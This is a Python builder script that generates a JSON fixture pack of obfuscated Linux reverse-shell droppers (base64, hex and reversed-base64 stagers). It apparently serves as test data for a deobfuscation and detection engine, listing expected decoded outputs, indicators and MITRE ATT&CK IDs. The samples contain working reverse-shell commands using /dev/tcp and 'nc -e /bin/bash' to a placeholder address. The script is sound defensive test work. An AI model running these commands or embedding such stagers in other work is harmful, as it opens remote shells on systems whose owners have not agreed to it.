"""
Phase R1 \u00b7 Linux Droppers family sample builder (technique-first schema).

Small deterministic pack covering real-world bash-native reverse-shell
droppers and stagers observed in Linux compromise events. Every sample
is a real technique documented in public IR reports:

* `echo '<b64>' | base64 -d | bash` \u2014 canonical Kali/Metasploit
  stager format, seen in dozens of public CTF and IR writeups.
* `echo '<hex>' | xxd -r -p | bash` \u2014 same family with hex encoding
  (observed in TeamTNT and Kinsing droppers).
* `echo '<reversed>' | rev | base64 -d | bash` \u2014 the double-layer
  variant repaired in M8 S02 and observed in public red-team droppers.

The Convergence Engine reduces each pipeline deterministically via
``semantic-bash-pipeline-reduce`` (whitelisted stage set: rev, base64,
xxd, tr, gunzip, zcat, cat, rot13).
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "linux_droppers.json"


def _sample(sid, variant, input_str, interpreter, final_interpreter,
            decoder_chain, final_output_contains, iocs_contains,
            mitre_attack, behaviors):
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


_REV_SHELL = "bash -i >& /dev/tcp/10.10.10.42/4444 0>&1"


TECHNIQUES: list[dict] = [
    {
        "id": "bash_echo_base64_pipeline",
        "display_name": "bash echo | base64 -d | pipeline",
        "description": (
            "Canonical Kali/Metasploit bash reverse-shell stager: "
            "`echo '<b64>' | base64 -d | bash`. Observed in TeamTNT, "
            "Kinsing, and dozens of public CTF/IR writeups."
        ),
        "mitre_attack": ["T1059.004", "T1027", "T1140", "T1071.001"],
        "samples": [
            _sample(
                "LD001", "echo_base64_decode_bash_pipeline",
                f"echo '{base64.b64encode(_REV_SHELL.encode()).decode()}' | base64 -d",
                "bash", "bash",
                ["bash-pipeline-reduce"],
                ["bash -i", "/dev/tcp/10.10.10.42/4444"],
                ["/dev/tcp/10.10.10.42/4444"],
                ["T1059.004", "T1027", "T1140", "T1071.001"],
                ["reverse_shell", "obfuscated_command_line"],
            ),
        ],
    },
    {
        "id": "bash_echo_hex_pipeline",
        "display_name": "bash echo | xxd -r -p pipeline",
        "description": (
            "Hex-encoded bash stager: `echo '<hex>' | xxd -r -p | bash`."
            " Observed in TeamTNT / Kinsing cryptomining loaders."
        ),
        "mitre_attack": ["T1059.004", "T1027", "T1140"],
        "samples": [
            _sample(
                "LD002", "echo_hex_decode_bash_pipeline",
                f"echo '{_REV_SHELL.encode().hex()}' | xxd -r -p",
                "bash", "bash",
                ["bash-pipeline-reduce"],
                ["bash -i", "/dev/tcp/10.10.10.42/4444"],
                ["/dev/tcp/10.10.10.42/4444"],
                ["T1059.004", "T1027", "T1140"],
                ["reverse_shell", "obfuscated_command_line"],
            ),
        ],
    },
    {
        "id": "bash_echo_rev_base64_pipeline",
        "display_name": "bash echo | rev | base64 -d | xxd -r -p pipeline",
        "description": (
            "Double-obfuscated bash stager repaired in M8 S02 and "
            "observed in public red-team droppers: the payload is "
            "hex-then-base64-then-reversed."
        ),
        "mitre_attack": ["T1059.004", "T1027", "T1140"],
        "samples": [
            _sample(
                "LD003", "echo_rev_base64_xxd_pipeline",
                "echo '"
                + base64.b64encode(
                    "nc 10.10.10.42 4444 -e /bin/bash".encode().hex().encode()
                ).decode()[::-1]
                + "' | rev | base64 -d | xxd -r -p",
                "bash", "bash",
                ["bash-pipeline-reduce"],
                ["nc 10.10.10.42 4444", "/bin/bash"],
                ["10.10.10.42 4444"],
                ["T1059.004", "T1027", "T1140"],
                ["reverse_shell", "obfuscated_command_line", "multi_layer_obfuscation"],
            ),
        ],
    },
]


def build() -> dict:
    known_universe = sorted({t["id"] for t in TECHNIQUES})
    return {
        "family_id": "linux_droppers",
        "family_display_name": "Linux Droppers",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "Real-world bash-native reverse-shell droppers and stagers "
            "observed in Linux compromise events (TeamTNT, Kinsing, "
            "public red-team droppers, Metasploit/Kali stagers)."
        ),
        "primary_mitre_attack": ["T1059.004", "T1027", "T1140", "T1071.001"],
        "primary_behaviors": [
            "reverse_shell",
            "obfuscated_command_line",
            "linux_compromise",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": [],
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    print(
        f"Wrote {sample_count} Linux-Droppers samples across "
        f"{len(payload['techniques'])} techniques to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
